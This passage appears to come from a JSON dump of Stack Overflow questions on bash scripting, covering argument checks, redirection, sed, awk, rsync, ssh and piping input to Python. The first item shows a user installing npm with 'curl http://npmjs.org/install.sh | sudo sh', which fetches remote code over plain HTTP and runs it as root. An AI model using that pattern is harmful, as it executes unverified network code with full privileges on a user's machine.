order:</p>\n\n<pre><code>node\nmongodb-server\nnpm\nexpress\nmongoose\n</code></pre>\n\n<p>now, trying to create a new app i noticed express cannot be used in the shell.\n<code>express -v</code>  returns\nexpress: command not found</p>\n\n<p>i installed npm like this</p>\n\n<pre><code>curl http://npmjs.org/install.sh | sudo sh\n</code></pre>\n\n<p>and i installed express this way</p>\n\n<pre><code>npm install express\n</code></pre>\n\n<p>any ideas?</p>\n"},{"tags":["bash","error-handling","multiplicity"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":12966622,"title":"Make Bash script exit and print error message if users invoke the script incorrectly","body":"<p>Script needed was</p>\n\n<pre><code>#!/bin/bash\n\n# Check if there are two arguments\nif [ $# -eq 2 ]; then\n   # Check if the input file actually exists.\n   if ! [[ -f \"$1\" ]]; then\n     echo \"The input file $1 does not exist.\"\n     exit 1\n   fi\nelse\n   echo \"Usage: $0 [inputfile] [outputfile]\"\n   exit 1\nfi\n\n# Run the command on the input file\ngrep -P \"^[\\s]*[0-9A-Za-z-]+.?[\\s]*$\" \"$1\" &gt; \"$2\"\n</code></pre>\n\n<p>Edit, the script has changed to </p>\n\n<pre><code>grep -P \"^[\\s]*[0-9A-Za-z-]+.?[\\s]*$\" $*\nif [ ! -f \"$1\" ]; then\n\n  echo 'Usage: '\n  echo\n  echo './Scriptname inputfile &gt; outputfile'\n  exit 0\n\nfi\n</code></pre>\n\n<p>invoking the script with no parameters gives no erros and sits blank</p>\n\n<pre><code>Usage: \n\n./Scriptname inputfile &gt; outputfile\n</code></pre>\n\n<p>I have bit of code </p>\n\n<pre><code>grep -P \"^[\\s]*[0-9A-Za-z-]+.?[\\s]*$\" $*\n</code></pre>\n\n<p>This code pulls lines that have a single word on them and pumps the output to a new file, so for example</p>\n\n<blockquote>\n<pre><code>This is a multi word line\nthis\nthe above line is not\nnow\nonce again wrong\n</code></pre>\n</blockquote>\n\n<p>The output would be </p>\n\n<pre><code>This\nnow\n</code></pre>\n\n<p>The code works, users invoke the code using <code>./scriptname file &gt; newfile</code></p>\n\n<p>However, I am trying to expand the code to give users an error message if they invoke the script incorrectly. </p>\n\n<p>For the error messange, I'm thinking of echoing something back like <code>scriptname file_to_process &gt; output_file</code>. </p>\n\n<p>I did try</p>\n\n<pre><code>if [incorrectly invoted unsure what to type]\necho $usage\n\nexit 1\nUsage=\"usage [inputfile] [&gt;] [outputfile]\n</code></pre>\n\n<p>However I have had little luck. The code runs but does nothing if I invoke with just the script name. Also, if I invoke the script with just the scriptname and the input file, it will output the results instead of exiting with the error message.</p>\n\n<p>Other ones I have tried are</p>\n\n<pre><code>if [ ! -n $1 ]; then\n\n  echo 'Usage: '\n  echo \n  echo './Scriptname inputfile &gt; outputfile'\n  exit 0\n\nfi\n</code></pre>\n\n<p>Given replies I have received so far, my code now is </p>\n\n<pre><code>#!/bin/bash\ngrep -P \"^[\\s]*[0-9A-Za-z-]+.?[\\s]*$\" $*\nif [ ! -f \"$1\" ]; then\n\n  echo 'Usage: '\n  echo \n  echo './Scriptname inputfile &gt; outputfile'\n  exit 0\n\nfi\n</code></pre>\n\n<p>When invoking the script without an input file the script does nothing and has to be aborted with ctrl+c, still trying to get the echo of the invoke message. </p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12989615,"title":"Check if file is in a given directory (or sub-directory) in bash","body":"<p>How can I check if a given file is in a directory, including any directories with that directory, and so on? I want to do a small sanity check in a bash script to check that the user isn't trying to alter a file outside the project directory.</p>\n"},{"tags":["javascript","bash","imagemagick","phantomjs"],"answer_count":1,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":1050,"score":4,"question_id":9390493,"title":"How to take a snapshot of a section of a web page from the shell?","body":"<p>I have a section of a web page that I need to take a gif snapshot of at a given time interval.  The snapshot needs to be full page size resolution, however as I said, it only goes to a certain place on the page (in this case it's after a table).</p>\n\n<p>What would be the best way to grab a page snapshot image image like this?  I'd like to just throw it into a cron job and forget it, but I'm not readily seeing a tool that would make quick work of this.</p>\n\n<h2>SOLUTION:</h2>\n\n<p>As per the @Eduardo's excellent direction I implemented a clean and quick solution based around phantomjs and imagemagick (Mac: <code>brew install phantomjs</code> &amp; <code>brew install imagemagick</code>):</p>\n\n<p>*NOTE: If you want to remove imagemagick altogether just add the following to rasterize.js: <code>page.clipRect = { top: 10, left: 10, width: 500, height: 500 }</code></p>\n\n<pre><code>#! /usr/bin/env bash\n# Used with PhantomJS - rasterize.js source: http://j.mp/xC7u1Z\n\nrefresh_seconds=30\n\nwhile true; do\n    date_now=`date +\"%Y-%m-%d %H%M\"` \n\n    phantomjs rasterize.js $1 \"${date_now}-original.png\"  # just sucking in the first arg from shell for the URL\n    convert \"${date_now}-original.png\" -crop 500x610+8+16 \"${date_now}.png\" # crop args: WIDTHxHEIGHT+LEFT_MARGIN+TOP_MARGIN\n    rm \"${date_now}-original.png\"\n\n    echo \"Got image: ${date_now}.png - Now waiting ${refresh_seconds} seconds for next image...\"\n    sleep ${refresh_seconds}\ndone\n</code></pre>\n\n<p>And here's the js used by phantomjs in the above: </p>\n\n<pre><code>// As explained here: http://code.google.com/p/phantomjs/wiki/QuickStart\n\nvar page = new WebPage(),\n    address, output, size;\n\nif (phantom.args.length &lt; 2 || phantom.args.length &gt; 3) {\n    console.log('Usage: rasterize.js URL filename');\n    phantom.exit();\n} else {\n    address = phantom.args[0];\n    output = phantom.args[1];\n    page.viewportSize = { width: 600, height: 600 };\n    page.open(address, function (status) {\n        if (status !== 'success') {\n            console.log('Unable to load the address!');\n        } else {\n            window.setTimeout(function () {\n                page.render(output);\n                phantom.exit();\n            }, 200);\n        }\n    });\n}\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":8284122,"title":"How to check if a line from a file is empty with bash","body":"<p>I have a while loop which reads lines from a file using read line.\nThen I want to check if the line is empty or not, how can I do it?\nI already found questions about lines with space or about a variable in this site.</p>\n"},{"tags":["bash","ssh","pid","synergy"],"answer_count":6,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":17665,"score":9,"question_id":1821968,"title":"PID of last started process in Bash-Script","body":"<p>i am using the program synergy together with an ssh tunnel</p>\n\n<p>it works, i just have to open an console an type these two commands:</p>\n\n<pre><code>ssh -f -N -L localhost:12345:otherHost:12345 otherUser@OtherHost\nsynergyc localhost\n</code></pre>\n\n<p>because im lazy i made an Bash-Script which is run with one mouseclick on an icon: </p>\n\n<pre><code>#!/bin/bash\nssh -f -N -L localhost:12345:otherHost:12345 otherUser@OtherHost\nsynergyc localhost\n</code></pre>\n\n<p>the Bash-Script above works as well, but now i also want to kill synergy and the ssh tunnel via one mouseclick, so i have to save the PIDs of synergy and ssh into file to kill them later:</p>\n\n<pre><code>#!/bin/bash\n\nmkdir -p /tmp/synergyPIDs || exit 1\nrm -f /tmp/synergyPIDs/ssh || exit 1\nrm -f /tmp/synergyPIDs/synergy || exit 1\n\n[ ! -e /tmp/synergyPIDs/ssh ] || exit 1\n[ ! -e /tmp/synergyPIDs/synergy ] || exit 1\n\nssh -f -N -L localhost:12345:otherHost:12345 otherUser@OtherHost\necho $! &gt; /tmp/synergyPIDs/ssh\nsynergyc localhost\necho $! &gt; /tmp/synergyPIDs/synergy\n</code></pre>\n\n<p>but the files of this script are empty ...</p>\n\n<p>how do i get the PIDs of ssh and synergy?<br>\n( i try to avoid ps aux | grep ... | awk ... | sed ... combinations, there has to be an easier way)</p>\n"},{"tags":["bash","sorting","filter"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12955985,"title":"Filtering text file to get unique entries based on value in column 3","body":"<p>I know a bit of bash, but I am facing a problem to filter a file. I'll explain with an example : </p>\n\n<p><strong>Given a text file like the following (file1):</strong></p>\n\n<pre><code>10.10.12 bib24 Avenger goodone\n10.10.12 bib21 The_Dark_Knight_Rises betterone\n10.10.12 bib53 Avenger goodone\n10.10.12 bib35 Ice_Age wow\n11.10.12 bib53 TheAmazingSpiderMan nice\n11.10.12 bib54 TheAmazingSpiderMan nice\n11.10.12 bib01 Avenger goodone\n12.10.12 bib29 Avenger goodone\n12.10.12 bib11 TheAmazingSpiderMan nice\n12.10.12 bib03 Ice_Age wow\n12.10.12 bib98 Ice_Age wow\n14.10.12 bib12 Ice_Age wow\n</code></pre>\n\n<p><strong>This is the result I want (file2):</strong> </p>\n\n<pre><code>10.10.12 bib24 Avenger goodone\n10.10.12 bib21 The_Dark_Knight_Rises betterone\n10.10.12 bib35 Ice_Age wow\n11.10.12 bib53 TheAmazingSpiderMan nice\n</code></pre>\n\n<p><strong>So my question is :</strong> which command do I use to get this result (file2) ? (i.e. first entry of a movie, and not taking into account columns/fields 1, 2, and 4).</p>\n\n<p>I hope it's clear enough.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12979174,"title":"bash script to calculate average of several integer values","body":"<p>I need to write a bash script that adds the current values and returns the average. When I run the script <code>./average</code> I get the error message: <code>missing}</code>. I am not sure why the script isn't printing the average to screen when I run it. </p>\n\n<p>Here's what I have written thus far:</p>\n\n<pre><code>#! /bin/csh\nfor var in \"${sum[store1=100, store2= 75, store3= 74, store4= 100, store5= 100])}\"\n\ndo\ntotal= $sum(store1+store2+ store3+store4+store5))\n\n\necho $sum / 5\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12986950,"title":"How to execute diff on outputs of two scripts without creating temporary files?","body":"<p>I've got two programs: p3, p4 and one input file: 1.in. I want to check if p3 and p4 outputs are the same for 1.in input file and nothing that I write works. I want to do this without creating new files (I simply want to know how to do this to better know bash). I tried some naive combinations like:</p>\n\n<pre><code>diff (./p3 &lt; 1.in) (./p4&lt; 1.in)\n</code></pre>\n\n<p>But it doesn't work of course. Can anyone help? I'm using ubuntu 11.04.</p>\n"},{"tags":["linux","bash","command-substitution","variable-subsitution"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":10990000,"title":"Order of substitution in bash","body":"<p>I need to demonstrate the order in which command substitution, variable substitution and globbing occurs.  Any ideas on how to do it?</p>\n"},{"tags":["bash","io-redirection"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12986490,"title":"Bash: Explain the following the redirection cases","body":"<p>I am reading <a href=\"http://mywiki.wooledge.org/BashFAQ/002\" rel=\"nofollow\">BashFAQ/002</a> and came accross the following redirection cases. I have written my understanding with each case so please comment if I am wrong.</p>\n\n<p><strong>Case 1</strong></p>\n\n<pre><code>output=$(command 2&gt;&amp;1 &gt;/dev/tty)\n</code></pre>\n\n<p>Redirect <code>stderr</code> to <code>stdout</code> and than redirect <code>stdout</code> to <code>tty</code>. So, now both <code>stdout and stderr</code> redirects/output to terminal.</p>\n\n<p><strong>Case 2</strong></p>\n\n<pre><code>output=$(command 2&gt;&amp;1 &gt;/dev/null)\n</code></pre>\n\n<p>Redirect <code>stderr</code> to <code>stdout</code> and than redirect <code>stdout</code> to <code>/dev/null</code>. Although I don't understand the point of doing this because now both <code>stderr and stdout</code> are discarded.</p>\n\n<p><strong>Case 3</strong></p>\n\n<pre><code>output=$(command 3&gt;&amp;2 2&gt;&amp;1 1&gt;&amp;3-)\n</code></pre>\n\n<p>No, idea whatsoever whats happening here. I am not aware of <code>fd 3</code>.</p>\n\n<p><strong>Case 4</strong></p>\n\n<pre><code>exec 3&gt;&amp;1 \noutput=$(command 2&gt;&amp;1 1&gt;&amp;3)\nexec 3&gt;&amp;-\n</code></pre>\n\n<p>No, idea again.</p>\n\n<p>So, can someone explain to me in detail the case#3 and case#4 and point me to the relevant documentation.</p>\n"},{"tags":["bash","sed","grep"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":2105,"score":0,"question_id":4517662,"title":"grep pipe with sed","body":"<p>This is my bash command</p>\n\n<pre><code>grep -rl \"System.out.print\" Project1/ | \n    xargs -I{} grep -H -n \"System.out.print\" {} |\n    cut -f-2 -d: |\n    sed \"s/\\(.*\\):\\(.*\\)/filename is \\1 and line number is \\2/\n</code></pre>\n\n<p>What I'm trying to do here is,I'm trying to iterate through sub folders and check what files contains \"System.out.print\" (using grep)\nusing 2nd grep trying to get file names and line numbers\nusing sed command I display those to console.\nfrom here I want to remove \"System.out.print\" with \"XXXXX\" how I can pipe sed command to this?\npls help me\nthanxx </p>\n"},{"tags":["bash","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12848280,"title":"Ensuring correct time format in bash","body":"<p>I have a script which asks the user the following question:</p>\n\n<pre><code>read -p \"Input time duration of simulation in HH:MM:SS format\" -e Time\n</code></pre>\n\n<p>Now how do I ensure the user entered the correct form for $Time\nbefore the variable $Time is actually used?</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12850089,"title":"How to expand filenames that begins with a dash (-)","body":"<p>I know if you enclose a variable (that contains a filename) with double quotes, it will expand <code>$</code>, <code>*</code>s and backticks (<code>'</code>). For example <code>cmp \"$file1\" \"$file2\"</code> will be fine if both files contain <code>*</code>s at the beginning or anything else that's \"normal\". It won't work if the files have any number of dashes in the beginning though. Instead, it will try to do the literal meaning of -, treating it as an option. How do you get around this?</p>\n\n<p>This will work:</p>\n\n<pre><code>var1=*file.txt\nvar2=*file2.txt\n\ncmp \"$var1\" \"$var2\"\n</code></pre>\n\n<p>But</p>\n\n<pre><code>var1=-file.txt \ncmp \"$var1\" \"$var2\" \n</code></pre>\n\n<p>will say - is an unrecognized option. Any ideas?</p>\n"},{"tags":["regex","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":102,"score":0,"question_id":12851091,"title":"Extracting numbers with sed without using repetition modifiers ( +, ?, {m} )","body":"<p>I have something like this:</p>\n\n<pre><code>plym    fury    77      73      2500\nchevy   nova    79      60      3000\nford    mustang 65      45      10000\nvolvo   gl      78      102     9850\nford    ltd     83      15      10500\nchevy   nova    80      50      3500\nfiat    600     65      115     450\nhonda   accord  81      30      6000\nford    thundbd 84      10      17000\ntoyota  tercel  82      180     750\nchevy   impala  65      85      1550\nford    bronco  83      25      9500\n</code></pre>\n\n<p>and I need to create a list that show all the cars that cost less than $10,000, except Chevys.  The list should be sorted from lowest cost to highest .</p>\n\n<p>I must use <code>sed</code> with quit option and regular expression (DO NOT use repetition)</p>\n\n<p>so far I have this</p>\n\n<pre><code>grep -iv \"chevy\" cars | sort -nk 5 | sed '/regex$/ q'\n</code></pre>\n\n<p>I'm having a problem with the regex WITHOUT repetition.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12849062,"title":"\"Simple\" arithmetic","body":"<p>Why can't I do this simple arithmetic operation and store it in a variable in bash shell? I've been struggling with this and playing around with <code>()</code> and <code>$</code> symbols but no luck.</p>\n\n<pre><code>read t\nlet r=$(5/9)*$($t-32)\n</code></pre>\n\n<p>I get <code>a: let: r=*: syntax error: operand expected (error token is \"*\")</code></p>\n"},{"tags":["linux","bash","shell","centos","redhat"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12851470,"title":"Bash \"source\" command returns the wrong concatenated string","body":"<p>I have a configuration file like this:</p>\n\n<pre><code>//filename : stat.conf\nLAS_SERVER=\"127.0.0.1\"\nLAS_PORT=3306\nLAS_USER=root\nLAS_PWD=root\nLAS_DB=test\nCONN_STR_LAS_DB=\"-h$LAS_SERVER -P$LAS_PORT -u$LAS_USER -p$LAS_PWD $LAS_DB\"\n</code></pre>\n\n<p>Now I run the <code>source</code> command like this:</p>\n\n<pre><code>$ source ./stat.conf\n\n$ echo $CONN_STR_LAS_DB\ntestot.0.1\n</code></pre>\n\n<p>You can see that the result is wrong. not in our expectation.</p>\n\n<p>In contrast, I can get the right result if I run the command in the shell like this:</p>\n\n<pre><code>$ LAS_SERVER=\"127.0.0.1\"\n$ LAS_PORT=3306\n$ LAS_USER=root\n$ LAS_PWD=root\n$ LAS_DB=test\n$ CONN_STR_LAS_DB=\"-h$LAS_SERVER -P$LAS_PORT -u$LAS_USER -p$LAS_PWD $LAS_DB\"\n$ echo $CONN_STR_LAS_DB\n-h127.0.0.1 -P3306 -uroot -proot test\n</code></pre>\n\n<p>This is the right result.</p>\n\n<p>So, my question is: why I got the wrong result when using \"source ./stat.conf\" ?</p>\n\n<p>I tested the same operation on another computer, I can get the right result. Is there anything that I missed to config on my computer?</p>\n\n<p>My OS is CentOS 5.</p>\n"},{"tags":["linux","bash","ssh","autologin"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":104,"score":2,"question_id":12937634,"title":"Run scripts remotely via SSH","body":"<p>I need to collect user information from 100 remote servers. We have public/private key infrastructure for authentication, and I have configured <code>ssh-agent</code> command to forward key, meaning i can login on any server without password prompt (auto login). </p>\n\n<p>Now I want to run a script on all server to collect user information (how many user account we have on all servers). </p>\n\n<p>This is my script to collect user info. </p>\n\n<pre><code>#!/bin/bash\n_l=\"/etc/login.defs\"\n_p=\"/etc/passwd\"\n\n## get mini UID limit ##\nl=$(grep \"^UID_MIN\" $_l)\n\n## get max UID limit ##\nl1=$(grep \"^UID_MAX\" $_l)\n\nawk -F':' -v \"min=${l##UID_MIN}\" -v \"max=${l1##UID_MAX}\" '{ if ( $3 &gt;= min &amp;&amp; $3 &lt;= max  &amp;&amp; $7 != \"/sbin/nologin\" ) print $0 }' \"$_p\"\n</code></pre>\n\n<p>I don't know how to run this script using ssh without interaction?? </p>\n"},{"tags":["bash","shell","unix","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12982326,"title":"Shell function, do action with one arg","body":"<p>I'm trying to do something simple, such as mkdir based on a given argument.</p>\n\n<pre><code>#!/bin/bash\n\nmake_picNum() {\n    arg1 = $1\n    echo \"Making picture folder $arg1...\"\n    echo \"mkdir picNum_$arg1\"\n    echo \"Created album folder\"\n}\n</code></pre>\n\n<p>I'm assuming I have some basic syntax flaws.\nThe current output/action of running this with any given number as an argument is nada.</p>\n"},{"tags":["arrays","bash","quotes"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12985178,"title":"Bash quoted array expansion","body":"<p>WHen I write a bash program I typically construct calls like follows:</p>\n\n<pre><code>declare -a mycmd=( command.ext \"arg1 with space\" arg2 thing etc )\n\n\"${mycmd[@]}\" || echo \"Failed: foo\"\n</code></pre>\n\n<p>Where <code>die foo</code> is a bash function that prints <code>Error foo</code> and exits.</p>\n\n<p>But if I want to be clear about the error reason, I want to print the failed command:</p>\n\n<pre><code>\"${mycmd[@]}\" || echo \"Failed: foo: ${mycmd[*]}\"\n</code></pre>\n\n<p>So the user can run the dead command and find out <em>why</em>.  However, quoting is lost on this pass - the Failed message arguments that have spaces or escaped characters are not printed in a way that can be cut-n-pasted and run.</p>\n\n<p>Does anyone have a suggestion for a compact way to fix this problem?</p>\n\n<hr>\n\n<p>I think the problem is the way bash deals with argument parsing for commands, and the way (builtin) echo handles arguments.  Another way of stating the problem is:</p>\n\n<p>How can I <em>print</em> the quotes around arguments with spaces in the following bash example (which must be run as a script, not in immediate mode):</p>\n\n<pre><code>#!/bin/bash\nmkdir qatest; cd qatest\ndeclare -a myargs=(1 2 \"3 4\")\ntouch \"${myargs[@]}\"\nls\necho \"${myargs[@]}\"\n</code></pre>\n\n<p>actual result:</p>\n\n<pre><code>1  2  3 4\n1 2 3 4\n</code></pre>\n\n<p>desired result</p>\n\n<pre><code>1  2  3 4\n1 2 \"3 4\"\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>1  2  3 4\n\"1\" \"2\" \"3 4\"\n</code></pre>\n\n<p>In few additional bash code characters.</p>\n\n<hr>\n\n<h2>Question closed: @camh answered it magnificently:</h2>\n\n<p>updated script:</p>\n\n<pre><code>#!/bin/bash\nmkdir qatest; cd qatest\ndeclare -a myargs=(1 2 \"3 4\")\ntouch \"${myargs[@]}\"\nls\necho \"${myargs[@]}\"\necho $(printf \"'%s' \" \"${myargs[@]}\")\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>1  2  3 4\n1 2 3 4\n'1' '2' '3 4'\n</code></pre>\n"},{"tags":["bash","shell","scripting","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12984215,"title":"Bash script using sed to delete specific line doesn't work","body":"<p>I am trying to write a bash script to use sed to delete some lines of a file. The line numbers are stored in another file in reverse order. \nThe command I am trying to do is the following:</p>\n\n<pre><code>sed -e '{lineNumber}d' ./file.txt\n</code></pre>\n\n<p>This is what I have so far but it's not working</p>\n\n<pre><code>while read -r line \ndo \n   sed -e \"/${line}d\" ./file.txt\ndone &lt; ./lineNum.txt\n</code></pre>\n\n<p>I am getting the following error:<br>\nsed: -e expression #1, char 4: unterminated address regex</p>\n"},{"tags":["bash","amazon-ec2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":10526345,"title":"EC2 command line tools","body":"<p>I am trying to setup up Amazon's EC2 service and am having some trouble. </p>\n\n<p>I have downloaded the <a href=\"http://aws.amazon.com/developertools/351\" rel=\"nofollow\">Amazon EC2 API Tools</a>, which I've put in a folder <code>~/.ec2</code> along with my <code>.cert</code> and <code>.pem</code>files. </p>\n\n<p>When I attempt any command from <code>~/.ec2/bin</code> I get an error <code>/Users/zmjones/.ec2/bin/ec2-cmd: /usr/bin/env: bad interpreter: Operation not permitted</code>. I asked about this in <a href=\"http://stackoverflow.com/q/10525603/78845\">\"/usr/bin/env bad interpreter\"</a>.</p>\n\n<p>Now that I have removed the DOS line-endings using variants of this <code>mv /users/zmjones/.ec2/bin/ec2-add-keypair /users/zmjones/.ec2/bin/ec2-add-keypair.bak\ntr -d '\\r' &lt; /users/zmjones/.ec2/bin/ec2-add-keypair.bak &gt; /users/zmjones/.ec2/bin/ec2-add-keypair</code>, I've tried to execute some of the commands in <code>~/.ec2/bin</code> and have been unable to get it to work. </p>\n\n<p>I've gotten a permission denied error, which when I then use sudo, tells me that the environment variable <code>EC2_HOME</code> doesn't exist, while <code>echo $EC2_HOME</code> indicates that it does. Here is my <code>~/.bash_profile</code>.</p>\n\n<pre><code>PATH=/usr/bin:/bin:/usr/sbin:/sbin:/opt/local/bin:$PATH\nPATH=/opt/local/sbin:/usr/local/bin:/usr/x11/bin:/usr/texbin:$PATH\nPATH=/usr/local/texlive/2011/bin/x86_64-darwin:$PATH\nPATH=/Library/Frameworks/EPD64.framework/Versions/Current/bin:$PATH\nEC2_HOME=~/.ec2\nPATH=$EC2_HOME/bin:$PATH\nEC2_PRIVATE_KEY=`ls $EC2_HOME/pk-*.pem`\nEC2_CERT=`ls $EC2_HOME/cert-*.pem`\nJAVA_HOME=/System/Library/Frameworks/JavaVM.framework/Home/\n\nexport PATH\n</code></pre>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1699,"score":3,"question_id":5400228,"title":"Use array variable in awk?","body":"<pre><code>A=(aaa bbb ccc)    \ncat abc.txt | awk '{ print $1, ${A[$1]} }'\n</code></pre>\n\n<p>I want to index an array element based on the $1, but the code above is not correct in awk syntax. Could someone help?</p>\n"},{"tags":["python","bash","ssh","stdin"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12979663,"title":"Any way to allow STDIN in python over ssh with heredocs?","body":"<p>I have a bash script that takes in 3 parameters. I need to ssh into a remote terminal and execute a python script there using those parameters.</p>\n\n<pre><code>    #!/bin/bash\n\n    ssh -t -t -c blowfish -XC someServer &lt;&lt; EOF\n      python -u pythonToExecute.py $1 $2 $3\n    EOF\n</code></pre>\n\n<p>The python script takes these parameters, and based on certain combinations, might ask the user to specify an action (using raw_input)</p>\n\n<p>The issue I'm having is that the python script hangs after any input is inserted (assuming an issue with STDIN).</p>\n\n<p>The python script works perfectly if I call python within the ssh call, but then I can't use the bash arguments.</p>\n\n<p>I CANNOT use Paramiko, fabric, or any other external modules/packages.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["bash","shell","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12588276,"title":"extract subtring, splitting at pattern, using sed in bash script","body":"<p>Solution:</p>\n\n<pre><code>#!/bin/bash\nfor f in *.mp3; do\n    d=\"${f% - *}\"\n    if [ -d $d ]; then\n        mv \"$f\" \"$d/\";\n    else \n        mkdir \"$d\" &amp;&amp; mv \"$f\" \"$d/\";\n    fi \ndone\n</code></pre>\n\n<hr>\n\n<p>I'm trying this:</p>\n\n<pre><code>$ echo \"foo - bar.ext\" | sed 's/\\('\" - \"'\\).*/\\1/' | sed 's/ - //'\n</code></pre>\n\n<p>which gives me just \"foo\". I guess there is a better way...Don't hit me hard, I'm new to sed. But now, how to include it in a loop like this:</p>\n\n<pre><code>#!/bin/bash\nfor f in *.ext; do\n    d=\"${f%.*}\"\n    #Extract Filename String before the \" - \" and write back to $d\n    mkdir \"$d\" &amp;&amp; mv \"$f\" \"$d/\";\ndone\n</code></pre>\n\n<p>Thanks in advance</p>\n\n<p><em>Further information:</em></p>\n\n<p>$f shall remain unchanged while a directory name, stored in $d, shall contain only the \"foo\"- part of a pattern matching \"foo - bar.ext\".</p>\n\n<p>Basically, a list of files, following the pattern \"foo - bar.ext\" should be moved to directories which are named \"foo\".</p>\n\n<p>E.g.:\nfoo1 - bar1.ext\nfoo1 - bar2.ext\nfoo1 - bar2.ext\n--> will be moved to subdir \"foo1\"</p>\n\n<p>anotherfoo - anotherbar.ext\n--> will be moved to subdir \"anotherfoo\"</p>\n"},{"tags":["bash","rsync","exitstatus"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12980779,"title":"Is there a succint way to test exit status of a set of commands in bash?","body":"<p>I have a simple script to pull data from a remote server as a process generates it using <code>rsync</code>:</p>\n\n<pre><code>while :\ndo\n    rsync -avz --remove-source-files -e ssh me@remote:path/to/foo* ./\n\n    rsync -avz --remove-source-files -e ssh me@remote:path/to/bar* ./\n\n    rsync -avz --remove-source-files -e ssh me@remote:path/to/baz* ./\n\n    rsync -avz --remove-source-files -e ssh me@remote:path/to/qux* ./\n\n    sleep 900 #wait 15 minutes, try again\ndone\n</code></pre>\n\n<p>If there are no files, <code>rsync</code> returns exit status 12 (apparently).  In the event that <strong>none</strong> of the above calls to <code>rsync</code> finds any data, I would like to break from the loop (the process generating the data probably exited).  To alleviate any confusion, I do <strong>not</strong> want to break from the loop if even 1 of the <code>rsync</code> processes succeed.</p>\n\n<p>Is there a succinct way to do that in bash? </p>\n"},{"tags":["linux","bash","unix","sudo","su"],"answer_count":4,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":2978,"score":9,"question_id":4598001,"title":"How do you find the original user through multiple sudo and su commands?","body":"<p>When running a script via sudo or su I want to get the original user.  This should happen regardless of multiple <code>sudo</code> or <code>su</code> runs inside of each other and specifically <code>sudo su -</code>.</p>\n"},{"tags":["linux","bash","unix","command-line","end-of-line"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":494,"score":1,"question_id":10629231,"title":"Convert all EOL (dos->unix) of all files in a directory and sub-directories recursively without dos2unix","body":"<p>How do I convert all EOL (dos->unix) of all files in a directory and sub-directories recursively <strong>without</strong> <code>dos2unix</code>? (I do not have it and cannot install it.)</p>\n\n<p>Is there a way to do it using <code>tr -d '\\r'</code> and pipes? If so, how?</p>\n"},{"tags":["bash","shell","osx","grep"],"answer_count":8,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":9656,"score":6,"question_id":1447625,"title":"List files with certain extensions with ls and grep","body":"<p>I just want to get the files from the current dir and only output .mp4 .mp3 .exe files nothing else.\nSo I thought I could just do this:</p>\n\n<pre><code>ls | grep \\.mp4$ | grep \\.mp3$ | grep \\.exe$\n</code></pre>\n\n<p>But no, as the first grep will output just mp4's therefor the other 2 grep's won't be used.</p>\n\n<p>Any ideas?</p>\n\n<p>PS, Running this script on Slow Leopard.</p>\n"},{"tags":["python","bash","stdin"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1405,"score":6,"question_id":7141331,"title":"Pipe input to Python program and later get input from user","body":"<p>Let's say I want to pipe input to a Python program, and then later get input from the user, on the command line.</p>\n\n<pre><code>echo http://example.com/image.jpg | python solve_captcha.py\n</code></pre>\n\n<p>and the contents of <code>solve_captcha.py</code> are:</p>\n\n<pre><code>import sys \nimage_url = sys.stdin.readline()\n\n# Download and open the captcha...\n\ncaptcha = raw_input(\"Solve this captcha:\")\n# do some processing...\n</code></pre>\n\n<p>The above will trigger a <code>EOFError: EOF when reading a line</code> error.</p>\n\n<p>I also tried adding a <code>sys.stdin.close()</code> line, which prompted a <code>ValueError: I/O operation on closed file</code>. </p>\n\n<p>Can you pipe information to <code>stdin</code> and then later get input from the user?</p>\n\n<p><strong>Note:</strong> This is a stripped down, simplified example - please don't respond by 